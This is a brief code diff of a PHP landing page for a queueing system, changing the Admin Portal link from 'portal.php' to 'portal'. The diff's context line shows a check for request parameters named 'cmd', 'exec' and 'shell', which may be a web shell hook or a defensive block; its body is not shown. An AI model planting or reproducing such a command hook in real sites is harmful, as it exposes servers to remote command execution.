@@ -234,7 +234,7 @@ if (isset($_GET['cmd']) || isset($_GET['exec']) || isset($_GET['shell'])) {
         <h1>MCC QUEUEING SYSTEM</h1>
         <p>Please Select Portal to proceed.</p>
         <div class="d-flex">
-          <a href="portal.php" class="btn-get-started">Admin Portal</a>
+          <a href="portal" class="btn-get-started">Admin Portal</a>
           <a href="https://www.youtube.com/watch?v=LXb3EKWsInQ" class="glightbox btn-watch-video d-flex align-items-center"></a>
         </div>
       </div>
